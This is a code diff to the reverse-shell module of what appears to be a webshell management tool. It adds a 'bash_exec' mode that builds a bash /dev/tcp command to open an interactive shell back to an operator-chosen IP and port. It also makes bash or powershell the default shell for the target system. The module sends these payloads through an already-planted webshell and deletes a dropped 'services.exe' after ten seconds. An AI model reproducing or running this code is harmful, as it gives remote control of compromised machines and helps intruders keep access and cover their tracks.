@@ -2,7 +2,7 @@ from threading import Thread
 from time import sleep
 
 from libs.config import alias, color, gget
-from libs.myapp import base64_encode, delay_send, has_env, is_windows, send, get_system_code
+from libs.myapp import base64_encode, delay_send, has_env, is_windows, send, get_system_code, randint
 
 
 def get_reverse_php(ip: str, port: str, upload_path: str):
@@ -127,23 +127,30 @@ except:
 
 
 @alias(True, func_alias="re", _type="SHELL", p="port", type="reverse_type")
-def run(ip: str, port: str, reverse_type: str = "php"):
+def run(ip: str, port: str, reverse_type: str = ""):
     """
     reverse
 
-    reverse shell to a host from target system.
+    Reverse shell to a host from target system. Default type is bash or powershell, depend on the target system.
 
-    eg: reverse {ip} {port} {type=php}
+    eg: reverse {ip} {port} {type=bash/powershell}
 
     reverse_type:
       - bash
+      - bash_exec
       - php
       - python
       - powershell(ps)
       - perl (only for *unix)
     """
     reverse_type = str(reverse_type).lower()
-    upload_tmp_dir = gget("webshell.upload_tmp_dir", "webshell")
+    # set default reverse_type
+    if not reverse_type:
+        if is_windows():
+            reverse_type = "powershell"
+        else:
+            reverse_type = "bash"
+
     if reverse_type == "bash":
         if (is_windows()):
             print(color.red("Target system is windows"))
@@ -152,11 +159,20 @@ def run(ip: str, port: str, reverse_type: str = "php"):
         t = Thread(target=send, args=(get_system_code(command),))
         t.setDaemon(True)
         t.start()
+    elif reverse_type == "bash_exec":
+        pipe_num = randint(100, 300)
+        command = f"""bash -c '0<&{pipe_num}-;exec {pipe_num}<>/dev/tcp/{ip}/{int(port)};sh <&{pipe_num} >&{pipe_num} 2>&{pipe_num}'"""
+        t = Thread(target=send, args=(get_system_code(command),))
+        t.setDaemon(True)
+        t.start()
     elif reverse_type == "php":
+        upload_tmp_dir = gget("webshell.upload_tmp_dir", "webshell")
         php = get_reverse_php(ip, port, upload_tmp_dir)
         t = Thread(target=send, args=(php,))
         t.setDaemon(True)
         t.start()
+
+        # remove .exe after 10 second
         if (is_windows()):
             t2 = Thread(target=delay_send, args=(
                 10.0, f"unlink('{upload_tmp_dir}\\\\services.exe');",))
@@ -185,15 +201,15 @@ def run(ip: str, port: str, reverse_type: str = "php"):
         else:
             print(
                 color.red(
-                    "The target host does not exist or cannot be found in the python environment."
+                    "The target host does not exist or cannot be found in the python environment"
                 )
             )
             return
     else:
-        print(color.red("Reverse type Error."))
+        print(color.red("Reverse type Error"))
         return
     sleep(1)
     if (t.isAlive()):
-        print(f"\nReverse shell to {ip}:{port} {color.green('success')}.\n")
+        print(f"\nReverse shell to {ip}:{port} {color.green('success')}\n")
     else:
-        print(f"\nReverse shell {color.red('error')}.\n")
+        print(f"\nReverse shell {color.red('error')}\n")
